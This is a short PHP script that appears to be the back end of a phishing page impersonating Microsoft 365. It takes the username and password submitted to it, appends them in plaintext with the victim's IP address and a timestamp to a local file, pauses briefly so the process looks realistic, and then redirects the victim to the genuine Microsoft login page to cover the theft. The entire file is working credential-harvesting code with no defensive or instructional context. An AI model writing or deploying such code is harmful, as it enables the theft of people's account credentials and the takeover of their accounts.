<?php
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$timestamp = date('Y-m-d H:i:s');

$entry = "========================================\n";
$entry .= "Timestamp: $timestamp\n";
$entry .= "Service: Microsoft 365\n";
$entry .= "Username: $username\n";
$entry .= "Password: $password\n";
$entry .= "IP: $ip\n";
$entry .= "========================================\n\n";

file_put_contents("usernames.txt", $entry, FILE_APPEND | LOCK_EX);

// Wait briefly to appear realistic, then redirect
usleep(500000); // 500ms
header('Location: https://login.live.com/');
exit();
?>